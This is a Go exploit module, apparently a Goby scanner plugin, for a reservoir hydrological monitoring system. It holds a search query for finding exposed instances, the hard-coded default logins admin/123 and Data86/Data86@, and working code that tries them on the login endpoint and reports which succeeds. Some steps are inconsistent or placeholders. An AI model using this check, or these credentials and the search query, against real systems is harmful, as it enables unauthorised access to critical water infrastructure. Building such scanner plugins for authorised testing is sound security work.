package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
  "strings"
)

func init() {
	expJson := `{
    "Name": "PingSheng Reservoir Hydrological Monitoring System /WebServices/UserAdminService.asmx/LoginEx3 Weak Password Vulnerability",
    "Description": "<p>The PingSheng Reservoir Hydrological Monitoring System is a hydrological monitoring tool. This system has the capability to collect, report, and process real-time data on water levels, rainfall, flow, water quality, and other metrics, achieving comprehensive monitoring and early warning of reservoir water conditions. </p><p>However, the system has a weak password vulnerability, allowing attackers to log into the backend using Data86/Data86@ or admin/123.</p>",
    "Product": "PingSheng Reservoir Hydrological Monitoring System",
    "Homepage": "https://www.data86.com/",
    "DisclosureDate": "2024-06-18",
    "PostTime": "2024-06-21",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"js/PSExtend.js\" && body=\"js/jquery.cookie.js\"",
    "GobyQuery": "body=\"js/PSExtend.js\" && body=\"js/jquery.cookie.js\"",
    "Level": "1",
    "Impact": "<p>The system has a weak password vulnerability that attackers can exploit to log into the backend using Data86/Data86@ or admin/123, gaining access to sensitive data, which could lead to data leakage, deletion, or extortion.</p>",
    "Recommendation": "<p>Please promptly change the default weak username and password.</p>",
    "References": [
        "https://mp.weixin.qq.com/s/5eD_el2_pmupJK5nQnrt7A"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/WebServices/UserAdminService.asmx/LoginEx3",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "LoginName=admin&LoginPwd=123&isRemember=false"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"Result\":true",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/WebServices/UserAdminService.asmx/LoginEx3",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "LoginName=Data86&LoginPwd=Data86&isRemember=false"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"Result\":true",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Weak Password"
    ],
    "VulType": [
        "Weak Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "平升水库水文监测系统  /WebServices/UserAdminService.asmx/LoginEx3 弱口令漏洞",
            "Product": "平升水库水文监测系统",
            "Description": "<p>平升水库水文监测系统是一款水文监测工具。该系统具备对水位、降雨量、流量、水质等多项数据的实时采集、报送和处理能力，实现了水库水情信息的全面监测和预警。&nbsp;</p><p>该系统存在弱口令漏洞攻击者可使用Data86/Data86@或者admin/123登录后台。<br></p>",
            "Recommendation": "<p>立即更改所有默认用户名和密码，设置强密码<br></p>",
            "Impact": "<p>该系统存在弱口令漏洞攻击者可使用Data86/Data86@或者admin/123登录后台，获取敏感数据，导致数据信息泄露或被删除勒索。<br></p>",
            "VulType": [
                "弱口令"
            ],
            "Tags": [
                "弱口令"
            ]
        },
        "EN": {
            "Name": "PingSheng Reservoir Hydrological Monitoring System /WebServices/UserAdminService.asmx/LoginEx3 Weak Password Vulnerability",
            "Product": "PingSheng Reservoir Hydrological Monitoring System",
            "Description": "<p>The PingSheng Reservoir Hydrological Monitoring System is a hydrological monitoring tool. This system has the capability to collect, report, and process real-time data on water levels, rainfall, flow, water quality, and other metrics, achieving comprehensive monitoring and early warning of reservoir water conditions.&nbsp;</p><p>However, the system has a weak password vulnerability, allowing attackers to log into the backend using Data86/Data86@ or admin/123.<br></p>",
            "Recommendation": "<p>Please promptly change the default weak username and password.<br></p>",
            "Impact": "<p>The system has a weak password vulnerability that attackers can exploit to log into the backend using Data86/Data86@ or admin/123, gaining access to sensitive data, which could lead to data leakage, deletion, or extortion.<br></p>",
            "VulType": [
                "Weak Password"
            ],
            "Tags": [
                "Weak Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10962"
}`
	sendPayload6547 := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
		// 注意：返回的第一个值为bool值，若弱口令登录成功请返回true，否则返回false
		// 注意：vulPath是默认口令请求路径，请以 "/login" 的格式返回
		// 注意：vulInfo是默认口令，请以 "admin:123456" 的格式返回
		vulInfo := ``
		vulPath := `/WebServices/UserAdminService.asmx/LoginEx3`
    requestConfig := httpclient.NewPostRequestConfig("/WebServices/UserAdminService.asmx/LoginEx3")
    requestConfig.VerifyTls = false
    requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
    requestConfig.FollowRedirect = false
    requestConfig.Data = "LoginName=admin&LoginPwd=123&isRemember=false"
    if resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig); err == nil {
      if resp.StatusCode == 200 &&  strings.Contains(resp.RawBody, "\"Result\":true"){
        vulInfo=`admin:123`
        return true, vulInfo, vulPath
      }
    }
    requestConfig.Data = "LoginName=Data86&LoginPwd=Data86@&isRemember=false"
    if resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig); err == nil {
      if resp.StatusCode == 200 &&  strings.Contains(resp.RawBody, "\"Result\":true"){
        vulInfo=`Data86:Data86@`
        return true, vulInfo, vulPath
      }
    }
		return false, vulInfo, vulPath
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			respBool, vulInfo, vulPath := sendPayload6547(hostInfo)

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.Scheme() + "://" + vulInfo + "@" + hostInfo.HostInfo + vulPath
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			_, vulInfo, _ := sendPayload6547(expResult.HostInfo)
      expResult.Output = `Please use "` + vulInfo + `" to login`
      expResult.Success = true
			return expResult
		},
	))
}
